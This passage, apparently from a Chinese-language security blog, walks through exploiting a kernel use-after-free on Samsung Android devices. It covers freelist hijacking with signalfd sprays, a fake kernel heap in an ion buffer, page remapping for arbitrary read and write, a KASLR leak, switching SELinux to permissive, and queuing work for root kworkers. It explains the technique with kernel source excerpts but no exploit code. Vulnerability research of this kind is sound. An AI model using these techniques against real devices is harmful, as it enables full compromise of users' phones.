<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-4.webp" alt="Kernel-4"></p>
<p>这将导致一个无限循环，并耽误CPU。虽然它很难看，但假的对象应该能解决取消引用的问题并避免崩溃，所以它可能不是一个致命的问题。不幸的是，由于该循环在自旋锁内运行，在运行了一小段时间后，看门狗似乎会将其标记为占用CPU的问题并触发内核恐慌。所以，需要找到一种方法来退出循环，而且是快速退出。</p>
<p>看看函数<code>dma_fence_signal_locked</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dma_fence_signal_locked</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">cb_list</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* Stash the cb_list before replacing it with the timestamp */</span></span><br><span class="line">    list_replace(&amp;fence-&gt;cb_list, &amp;cb_list);             <span class="comment">//&lt;-- 1.</span></span><br><span class="line">    ...</span><br><span class="line">    list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) &#123; <span class="comment">//&lt;-- 2.</span></span><br><span class="line">        INIT_LIST_HEAD(&amp;cur-&gt;node);</span><br><span class="line">        cur-&gt;func(fence, cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数将对列表<code>temp</code>中的每个假<code>dma_fence</code>（原始已释放的和替换的<code>dma_fence</code>，加上它在<code>ion buffer</code>中链接的那些）运行。如前所述，如果运行上面2处的代码，那么内核可能会崩溃，因为不能提供一个有效的<code>func</code>，所以还是避免运行这个路径。</p>
<p>为了能够运行这段代码而不是上面2中的循环代码，需要将<code>fence.cb_list</code>初始化为一个空列表，这样它的<code>next</code>和<code>prev</code>都指向它自己。这对于被漏洞释放的初始假<code>dma_fence</code>来说是不可能的，因为<code>fence</code>的地址以及<code>fence.cb_list</code>是未知的，所以不得不对这个第一个假对象完全避免使用<code>list_replace</code>代码。然而，由于随后链接到它的假<code>dma_fence</code>对象是在一个已知地址的<code>ion</code>缓冲区中，现在可以为这些对象创建一个空的<code>cb_list</code>，将<code>next</code>和<code>prev</code>指针都设置为<code>fence.cb_list</code>字段的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">list_replace</span><span class="params">(<span class="keyword">struct</span> list_head *old,</span></span><br><span class="line"><span class="params">                <span class="keyword">struct</span> list_head *new)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//old-&gt;next = &amp;(fence-&gt;cb_list)</span></span><br><span class="line">    new-&gt;next = old-&gt;next;</span><br><span class="line">    <span class="comment">//new-&gt;next = &amp;(fence-&gt;cb_list) =&gt; fence-&gt;cb_list.prev = &amp;cb_list</span></span><br><span class="line">    new-&gt;next-&gt;prev = new;</span><br><span class="line">    <span class="comment">//new-&gt;prev = fence-&gt;cb_list.prev =&gt; &amp;cb_list</span></span><br><span class="line">    new-&gt;prev = old-&gt;prev;</span><br><span class="line">    <span class="comment">//&amp;cb_list-&gt;next = &amp;cb_list</span></span><br><span class="line">    new-&gt;prev-&gt;next = new;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>list_replace</code>之后，堆栈变量<code>cb_list</code>的地址已经被写入了<code>fence-&gt;cb_list.prev</code>，它在<code>ion</code>缓冲区的某处。由于<code>ion</code>缓冲区被映射到了用户空间，可以通过轮询<code>ion</code>缓冲区简单地读取这个地址。由于<code>dma_fence_signal_locked</code>是在堆栈变量<code>temp</code>被分配后在<code>kgsl_ioctl_timeline_destroy</code>里面运行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">temp</span>;</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        <span class="comment">//cb_list, is a stack variable allocated inside `dma_fence_signal_locked`</span></span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有了<code>cb_list</code>的地址，就可以计算<code>temp</code>的地址，（它与<code>cb_list</code>的地址有一个固定的偏移），所以通过轮询<code>cb_list</code>的地址，然后用它来计算<code>temp</code>的地址，并把它写回<code>ion</code>缓冲区中一个假的<code>kgsl_timeline_fence</code>对象的下一个指针，可以在看门狗咬人之前退出循环。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-5.webp" alt="Kernel-5"></p>
<h2 id="Hijacking-the-freelist"><a href="#Hijacking-the-freelist" class="headerlink" title="Hijacking the freelist"></a>Hijacking the freelist</h2><p><code>dma_fence_put</code>将减少假对象的<code>refcount</code>，如果<code>refcount</code>达到0，它将调用<code>dma_fence_free</code>，然后用<code>kfree_rcu</code>释放该对象。现在假设假对象将被<code>kfree_rcu</code>释放。通过用另一个对象再次替换这个假对象，就可以得到对同一个对象的两个引用，将能够在任何时候使用这些对象的句柄释放这些对象。一般的想法是，当一个内存块被释放时，指向下一个自由块的<code>freelist</code>指针将被写入内存块的前8字节。如果从一个句柄中释放对象，然后用另一个句柄修改这个被释放的对象的前8字节，那么就可以劫持<code>freelist</code>指针，让它指向选择的地址，这就是下一次分配将发生的地方。</p>
<p>为了能够修改对象分配后的前8字节，这里使用“<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">Mitigations are attack surface too</a>”中使用的<code>signalfd</code>对象。<code>signalfd</code>系统调用分配了一个8字节的对象来存储<code>signalfd</code>文件的掩码，这个掩码可以由用户指定，但有一些小限制。所分配对象的寿命与返回给用户的<code>signalfd</code>文件相联系，可以通过关闭该文件轻松控制。此外，这个对象的前8个字节可以通过用不同的掩码再次调用<code>signalfd</code>来改变。</p>
<p>为了劫持freelist指针：</p>
<ol>
<li>触发UAF bug，用一个通过<code>sendmsg</code>分配的假的<code>dma_fence</code>对象替换已释放的对象，这样<code>dma_fence_free</code>将被调用，用<code>kfree_rcu</code>释放这个假对象。</li>
<li>用<code>signalfd</code>堆喷，在<code>sendmsg</code>对象被释放后，在同一地址分配另一个对象。</li>
<li>释放<code>sendmsg</code>对象，使<code>freelist</code>指针被写入第二步中<code>signalfd</code>对象的掩码。</li>
<li>修改<code>signalfd</code>对象的掩码，使<code>freelist</code>指针现在指向一个指定的地址，然后再次堆喷，在该地址分配对象。</li>
</ol>
<p>如果将<code>freelist</code>指针的地址设置为我们控制的<code>ion</code>缓冲区的地址，那么随后的分配将把对象放入<code>ion</code>缓冲区，然后可以随时访问和修改，即，可以在一个有读和写权限的区域内伪造自己的内核堆。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-6.webp" alt="Kernel-6"></p>
<p>这个方案的主要障碍来自于<code>kfree_rcu</code>和运行<code>dma_fence_put</code>的<code>CPU</code>在调用<code>kfree_rcu</code>后将暂时陷入一个繁忙的循环。回顾上一节，在能够通过将 <code>temp</code> 列表的地址写入假的<code>kgsl_timeline_fence::node</code>对象的下一个指针来退出循环之前，这个循环将一直运行。这意味着，一旦调用<code>kfree_rcu</code>，<code>dma_fence_put</code>被退出，该循环将继续处理运行<code>kfree_rcu</code>的<code>CPU</code>上的其他假<code>dma_fence</code>对象。正如前面所解释的，<code>kfree_rcu</code>不会立即释放一个对象，而是延迟移除。大多数情况下，释放将实际发生在调用<code>kfree_rcu</code>的同一个<code>CPU</code>上。然而，在这种情况下，由于运行<code>kfree_rcu</code>的<code>CPU</code>因为运行循环而在 <code>spinlock</code> 中保持繁忙，对象几乎肯定不会在同一个<code>CPU</code>上被释放。相反，一个不同的<code>CPU</code>将被用来释放该对象。这导致了一个问题，因为对象替换的可靠性取决于用于释放对象的<code>CPU</code>。当一个对象在<code>CPU</code>上被释放时，内存分配器将把它放在每个<code>CPU</code>的缓存中。紧接着在同一<code>CPU</code>上进行的分配将首先在<code>CPU</code>缓存中寻找空闲空间，并且很可能会替换那个新释放的对象。然而，如果分配发生在不同的<code>CPU</code>上，那么它很可能会替换不同<code>CPU</code>缓存中的一个对象，而不是新释放的对象。不知道哪个<code>CPU</code>负责释放对象，再加上对象被释放的时间不确定（因为<code>kfree_rcu</code>引入的延迟），意味着可能很难替换对象。然而，在实践中，简单地运行一个循环，在每个<code>CPU</code>上喷射物体，并以一定的间隔重复喷射，以考虑到时间上的不确定性（成功率大于70%）。</p>
<p>漏洞中使用的另一个小修改是，在<code>sendmsg</code>对象被释放后，用另一轮<code>signalfd</code>堆喷来替换它们。这是为了确保这些<code>sendmsg</code>对象不会意外地被不控制的对象所替换，从而干扰了漏洞的利用，同时也是为了更容易识别实际被破坏的对象。</p>
<p>现在可以劫持<code>freelist</code>并将新的对象分配重定向到可以随时自由访问的<code>ion</code>缓冲区，现在需要将其变成一个任意的内存读写原语。</p>
<h2 id="The-Device-Memory-Mirroring-Attack"><a href="#The-Device-Memory-Mirroring-Attack" class="headerlink" title="The Device Memory Mirroring Attack"></a>The Device Memory Mirroring Attack</h2><p>内核驱动经常需要将内存映射到用户空间，因此，经常有一些结构包含指向<code>page</code>结构或<code>sg_table</code>结构的指针。这些结构通常包含指向页面的指针，这些页面将被映射到用户空间，例如，当调用<code>mmap</code>时。这使得它们成为非常好的破坏目标。例如，<code>ion_buffer</code>对象在所有的Android设备上都可用。它有一个<code>sg_table</code>结构，包含了当<code>mmap</code>被使用时将被映射到用户空间的页面的信息。</p>
<p>除了可以广泛使用和从不可信任的应用程序中访问外，<code>ion_buffer</code>对象还解决了一些其他问题，所以在下面的内容中，将使用上面的<code>freelist</code>劫持原语，在有任意读写权限的<code>ion</code>缓冲区备份存储中分配一个<code>ion_buffer</code>结构。通过这样做，可以随意破坏所有被分配的 <code>ion_buffer</code> 结构中的数据。为了避免混淆，从现在开始，将使用术语 “假内核堆 “来表示用作假内核堆的<code>ion</code>缓冲区备份存储，以及在假内核堆中分配的用作破坏目标的结构的<code>ion_buffer</code>。</p>
<p>这里的总体想法是，通过在假的内核堆中分配<code>ion_buffer</code>结构，将能够修改<code>ion_buffer</code>结构，用受控数据替换其<code>sg_table</code>。<code>sg_table</code>结构包含一个<code>scatterlist</code>结构，表示支持<code>ion_buffer</code>结构的页面集合。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sg_table</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> *<span class="title">sgl</span>;</span>    <span class="comment">/* the list */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nents;     <span class="comment">/* number of mapped entries */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> orig_nents;    <span class="comment">/* original size of list */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>   page_link;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    length;</span><br><span class="line">    <span class="type">dma_addr_t</span>  dma_address;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NEED_SG_DMA_LENGTH</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    dma_length;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>scatterlist</code>中的<code>page_link</code>字段是一个页面指针的编码形式，表明<code>ion_buffer</code>结构的备份存储所在的实际页面。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> page *<span class="title function_">sg_page</span><span class="params">(<span class="keyword">struct</span> scatterlist *sg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SG</span></span><br><span class="line">    BUG_ON(sg_is_chain(sg));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> page *)((sg)-&gt;page_link &amp; ~(SG_CHAIN | SG_END));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当<code>mmap</code>被调用时，由<code>page_link</code>编码的页面将被映射到用户空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ion_heap_map_user</span><span class="params">(<span class="keyword">struct</span> ion_heap *heap, <span class="keyword">struct</span> ion_buffer *buffer,</span></span><br><span class="line"><span class="params">              <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sg_table</span> *<span class="title">table</span> =</span> buffer-&gt;sg_table;</span><br><span class="line">    ...</span><br><span class="line">    for_each_sg(table-&gt;sgl, sg, table-&gt;nents, i) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> sg_page(sg);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//Maps pages to user space</span></span><br><span class="line">        ret = remap_pfn_range(vma, addr, page_to_pfn(page), len,</span><br><span class="line">                      vma-&gt;vm_page_prot);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 <code>page</code> 指针只是页面物理地址的逻辑移位，然后是一个恒定的线性偏移（见<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/include/asm/memory.h#L285"><code>phys_to_page</code></a>的定义），能够控制<code>page_link</code>就可以把一个任意的页面映射到用户空间。对于许多设备来说，这就足以实现任意的内核内存读写，因为内核映像是在一个固定的物理地址上映射的（<code>KASLR</code>随机化了这个固定物理地址的虚拟地址偏移），所以在处理物理地址的时候不需要担心<code>KASLR</code>。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-7.webp" alt="Kernel-7"></p>
<p>然而，三星设备以不同的方式进行<code>KASLR</code>。内核镜像的物理地址不是映射到一个固定的物理地址，而是随机化的（严格来说，是内核认为的中间物理地址，这不是真正的物理地址，而是由管理程序给出的虚拟地址）。所以在我们的案例中，仍然需要泄露一个地址来打败<code>KASLR</code>。然而，有了假的内核堆，这就相当容易实现了。一个<code>ion_buffer</code>对象包含一个指向<code>ion_heap</code>的指针，它负责为<code>ion_buffer</code>分配后备存储。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ion_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_heap</span> *<span class="title">heap</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>虽然<code>ion_heap</code>在内核镜像中不是一个全局对象，但每个<code>ion_heap</code>都包含一个<code>ion_heap_ops</code>字段，它指向特定<code>ion_heap</code>对象的相应 <code>vtable</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ion_heap</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">plist_node</span> <span class="title">node</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">ion_heap_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_heap_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的<code>ops</code>字段是内核镜像中的一个全局对象。如果能够读取<code>ion_buffer-&gt;heap-&gt;ops</code>，那么也能够得到一个地址来打败<code>KASLR</code>，将内核镜像中的地址翻译成物理地址。这可以按以下方法进行。</p>
<ol>
<li>首先在假的内核堆中找到<code>ion_buffer</code>结构的位置。这可以通过<code>ion_buffer</code>中的<code>flags</code>字段来完成。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ion_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_heap</span> *<span class="title">heap</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>这是在创建<code>ion_buffer</code>时从<code>ION_IOC_ALLOC</code> <code>ioctl</code>的参数中传递的4个字节的值。可以将这些设置为特定的 “魔法 “值，并在假的内核堆中搜索它们。</p>
<ol start="2">
<li>一旦找到<code>ion_buffer</code>结构，读取其堆指针。这将是内核镜像之外的低内存区域的一个虚拟地址，因此，它的物理地址可以通过应用常数偏移来获得。</li>
<li>一旦获得相应的<code>ion_heap</code>对象的物理地址，修改<code>ion_buffer</code>的<code>sg_table</code>，使其后备存储指向包含<code>ion_heap</code>的页面。</li>
<li>在<code>ion_buffer</code>的文件描述符上调用<code>mmap</code>，这将把包含<code>ion_heap</code>的页面映射到用户空间。然后可以直接从用户空间读取该页以获得<code>OPS</code>指针，这将提供<code>KASLR</code>的偏移。</li>
</ol>
<p><code>ion_buffer</code>结构的使用也解决了另一个问题。虽然假内核堆很方便，但它并不完美。每当假内核堆中的一个对象被释放时，<code>kfree</code>将使用<code>PageSlab</code>检查来检查包含该对象的页面是否是来自<code>SLUB</code>分配器的单页<code>slab</code>。如果检查失败，那么<code>PageCompound</code>检查将被执行，以检查该页是否是一个更大的<code>slab</code>的一部分。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">void</span> *object = (<span class="type">void</span> *)x;</span><br><span class="line"></span><br><span class="line">    trace_kfree(_RET_IP_, x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(x)))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    page = virt_to_head_page(x);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!PageSlab(page))) &#123;     <span class="comment">//&lt;-------- check if the page allocated is a single page slab</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> order = compound_order(page);</span><br><span class="line"></span><br><span class="line">        BUG_ON(!PageCompound(page));     <span class="comment">//&lt;-------- check if the page is allocated as part of a multipage slab</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于这些检查是在包含页面元数据的页面结构本身上进行的，因此只要有对象被释放，它们就会失败并导致内核崩溃。这可以通过使用现在拥有的任意读写原语来覆盖页面结构中各自的元数据来解决（对应于物理地址的页面结构的地址只是物理地址的逻辑移动，然后是固定偏移量的转换，所以可以将包含页面结构的页面映射到用户空间并修改其内容）。然而，如果能够确保占据假内核堆的对象永远不会被释放，那就更简单了。在<code>ion_buffer</code>结构被释放之前，会调用<code>ion_buffer_destroy</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ion_buffer_destroy</span><span class="params">(<span class="keyword">struct</span> ion_device *dev, <span class="keyword">struct</span> ion_buffer *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    heap = buffer-&gt;heap;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (heap-&gt;flags &amp; ION_HEAP_FLAG_DEFER_FREE)</span><br><span class="line">        ion_heap_freelist_add(heap, buffer);    <span class="comment">//&lt;--------- does not free immediately</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ion_buffer_release(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>ion_heap</code>包含标志<code>ION_HEAP_FLAG_DEFER_FREE</code>，那么<code>ion_buffer</code>不会立即被释放，而是通过<code>ion_heap_freelist_add</code>被添加到<code>ion_heap</code>的<code>free_list</code>。添加到这个列表中的<code>ion_buffer</code>对象只有在以后需要的时候才会被释放，而且只有在<code>ION_HEAP_FLAG_DEFER_FREE</code>标志被设置的情况下。当然，通常情况下，<code>ION_HEAP_FLAG_DEFER_FREE</code>在<code>ION_heap</code>的生命周期内不会改变，但是通过我们的任意内存写入基元，可以简单地将<code>ION_HEAP_FLAG_DEFER_FREE</code>添加到<code>ION_heap-&gt;flags</code>中，释放<code>ION_buffer</code>，然后再次移除<code>ION_HEAP_FLAG_DEFER_FREE</code>，<code>ION_buffer</code>将只是停留在<code>ION_heap</code>的<code>freelist</code>中而永远不会被释放。此外，包含<code>ion_heap</code>对象的页面已经被映射，目的是为了绕过<code>KASLR</code>，所以切换该标志是相当微不足道的。通过喷洒假的内核堆，使其充满了<code>ion_buffer</code>对象及其附属物，可以确保这些对象永远不会被释放，避免内核崩溃。</p>
<h2 id="Bypassing-SELinux"><a href="#Bypassing-SELinux" class="headerlink" title="Bypassing SELinux"></a>Bypassing SELinux</h2><p>当<code>SELinux</code>被启用时，它可以在 <code>permissive</code> 模式或 <code>enforcing</code> 模式下运行。当处于 <code>permissive</code> 模式时，它将只审计和记录未经授权的访问，但不会阻止它们。<code>SELinux</code>的运行模式是由<code>selinux_enforcing</code>变量控制的。如果这个变量为零，那么<code>SELinux</code>就以 <code>permissive</code> 模式运行。通常，对系统安全至关重要的变量会受到三星内核数据保护（KDP）的保护，通过使用<code>__kdp_ro</code>或<code>__rkp_ro</code>属性将其标记为只读。这个属性表明该变量处于只读页面，其修改受到管理程序调用的保护。然而，在5.x分支的高通内核中，三星似乎忘记了保护这个变量（<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">又是这样吗</a>！）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//In security/selinux/hooks.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY_SELINUX_DEVELOP</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> selinux_enforcing_boot;</span><br><span class="line"><span class="type">int</span> selinux_enforcing;</span><br></pre></td></tr></table></figure>

<p>所以，可以直接将<code>selinux_enforcing</code>覆盖为零，并将<code>SELinux</code>设置为<code>permissive</code>模式。虽然还有其他绕过<code>SELinux</code>的方法（比如Valentina Palmiotti在这个<a target="_blank" rel="noopener" href="https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/selinux_bypass.c">漏洞</a>中使用的方法），但此时的捷径更受欢迎，所以将直接设置<code>selinux_enforcing</code>变量。</p>
<h2 id="Running-arbitrary-root-commands-using-ret2kworker-TM"><a href="#Running-arbitrary-root-commands-using-ret2kworker-TM" class="headerlink" title="Running arbitrary root commands using ret2kworker(TM)"></a>Running arbitrary root commands using ret2kworker(TM)</h2><p>在三星设备上获得<code>root</code>权限的一个众所周知的问题是三星的<code>RKP</code>（实时内核保护）所施加的保护。在安卓设备上获得<code>root</code>权限的一个常见方法是用<code>root</code>权限覆盖我们自己进程的证书。然而，三星的<code>RKP</code>写保护每个进程的凭证，所以这在这里是不可能的。在作者的上一次<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">利用</a>中，能够以<code>root</code>身份执行任意代码，因为所利用的特定UAF导致一个受控函数指针在以<code>root</code>身份运行的<code>kworker</code>的代码中被执行。</p>
<p>当然，通过任意的内存读写原语，可以简单地将对象添加到这些工作队列之一（基本上是包含工作结构的链接列表），并等待一个<code>kworker</code>来接取工作。事实证明，许多这些工作队列确实是静态的全局对象，在内核镜像中具有固定的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ffffffc012c8f7e0 D system_wq</span><br><span class="line">ffffffc012c8f7e8 D system_highpri_wq</span><br><span class="line">ffffffc012c8f7f0 D system_long_wq</span><br><span class="line">ffffffc012c8f7f8 D system_unbound_wq</span><br><span class="line">ffffffc012c8f800 D system_freezable_wq</span><br><span class="line">ffffffc012c8f808 D system_power_efficient_wq</span><br><span class="line">ffffffc012c8f810 D system_freezable_power_efficient_wq</span><br></pre></td></tr></table></figure>

<p>因此，将条目添加到这些工作队列中并让<code>kworker</code>来处理这些工作是比较直接的。然而，由于<code>kCFI</code>，只能调用具有以下签名的函数。</p>
